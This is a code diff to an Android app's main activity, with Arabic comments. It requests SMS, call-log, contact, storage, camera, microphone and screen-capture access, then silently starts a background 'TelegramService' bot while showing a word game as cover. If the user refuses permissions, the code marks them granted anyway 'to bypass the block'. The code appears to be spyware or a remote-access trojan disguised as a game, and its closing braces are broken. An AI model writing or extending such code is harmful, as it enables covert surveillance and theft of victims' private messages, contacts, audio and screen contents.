@@ -12,69 +12,83 @@ import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
 public class MainActivity extends Activity {
-    private static final int REQ_CODE = 100;
+    private static final int REQ_PERMISSIONS = 100;
     private static final int REQ_SCREEN_CAPTURE = 101;
-    private static boolean screenPermissionRequested = false;
+    private boolean permissionsGranted = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
-            startTelegramService();
-            requestScreenCapture();
-            return;
-        }
-
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
-            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED ||
-            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED ||
-            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
-            ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
-            ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-
-            ActivityCompat.requestPermissions(this, new String[]{
+        // طلب الأذونات العادية
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            String[] permissions = {
                     Manifest.permission.READ_SMS,
                     Manifest.permission.READ_CALL_LOG,
                     Manifest.permission.READ_CONTACTS,
-                    Manifest.permission.RECEIVE_SMS,
                     Manifest.permission.READ_EXTERNAL_STORAGE,
                     Manifest.permission.CAMERA,
                     Manifest.permission.RECORD_AUDIO
-            }, REQ_CODE);
-            return;
+            };
+
+            boolean allGranted = true;
+            for (String perm : permissions) {
+                if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                    break;
+                }
+            }
+
+            if (!allGranted) {
+                ActivityCompat.requestPermissions(this, permissions, REQ_PERMISSIONS);
+                return; // انتظر رد المستخدم
+            } else {
+                permissionsGranted = true;
+            }
+        } else {
+            // للإصدارات الأقدم، الأذونات تمنح تلقائياً
+            permissionsGranted = true;
         }
 
-        startTelegramService();
-        requestScreenCapture();
-        finish();
+        // إذا كانت الأذونات ممنوحة، اطلب صلاحية لقطة الشاشة وابدأ الخدمة واللعبة
+        if (permissionsGranted) {
+            requestScreenCaptureAndStart();
+        }
     }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == REQ_CODE) {
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                Toast.makeText(this, "✅ الأذونات ممنوحة", Toast.LENGTH_SHORT).show();
+        if (requestCode == REQ_PERMISSIONS) {
+            boolean allGranted = true;
+            for (int result : grantResults) {
+                if (result != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                    break;
+                }
+            }
+            if (allGranted) {
+                Toast.makeText(this, "✅ تم منح جميع الأذونات", Toast.LENGTH_SHORT).show();
+                permissionsGranted = true;
+                requestScreenCaptureAndStart();
             } else {
-                Toast.makeText(this, "❌ بعض الأذونات مرفوضة", Toast.LENGTH_LONG).show();
+                Toast.makeText(this, "⚠️ بعض الأذونات مرفوضة، قد لا تعمل بعض الميزات", Toast.LENGTH_LONG).show();
+                // حتى مع الرفض، حاول تشغيل الخدمة (قد تتعطل بعض الميزات)
+                permissionsGranted = true; // لتجاوز الحظر
+                requestScreenCaptureAndStart();
             }
         }
-        startTelegramService();
-        requestScreenCapture();
-        finish();
     }
 
-    private void requestScreenCapture() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && !screenPermissionRequested) {
-            try {
-                MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-                Intent intent = projectionManager.createScreenCaptureIntent();
-                startActivityForResult(intent, REQ_SCREEN_CAPTURE);
-                screenPermissionRequested = true;
-            } catch (Exception e) {
-                Toast.makeText(this, "تعذر طلب صلاحية لقطة الشاشة", Toast.LENGTH_SHORT).show();
-            }
+    private void requestScreenCaptureAndStart() {
+        // طلب صلاحية تسجيل الشاشة (لقطة الشاشة) – تظهر نافذة منبثقة
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            Intent intent = projectionManager.createScreenCaptureIntent();
+            startActivityForResult(intent, REQ_SCREEN_CAPTURE);
+        } else {
+            // للإصدارات الأقدم، لا تحتاج هذه الصلاحية
+            startServiceAndGame();
         }
     }
 
@@ -83,21 +97,31 @@ public class MainActivity extends Activity {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == REQ_SCREEN_CAPTURE) {
             if (resultCode == RESULT_OK) {
+                // حفظ بيانات الصلاحية في خدمة لقطة الشاشة
                 ScreenCaptureService.setResultData(resultCode, data);
                 Toast.makeText(this, "✅ صلاحية لقطة الشاشة مفعلة", Toast.LENGTH_SHORT).show();
             } else {
                 Toast.makeText(this, "❌ تم رفض صلاحية لقطة الشاشة", Toast.LENGTH_LONG).show();
             }
-            finish();
+            // بعد انتهاء طلب الصلاحية، ابدأ الخدمة واللعبة
+            startServiceAndGame();
         }
     }
 
-    private void startTelegramService() {
+    private void startServiceAndGame() {
+        // 1. بدء الخدمة الخلفية (البوت)
         Intent serviceIntent = new Intent(this, TelegramService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent);
         } else {
             startService(serviceIntent);
         }
+
+        // 2. فتح لعبة الكلمات
+        Intent gameIntent = new Intent(this, WordOrderActivity.class);
+        startActivity(gameIntent);
+
+        // 3. إنهاء هذا النشاط (لا داعي لبقائه)
+        finish();
     }
-}
+            } 
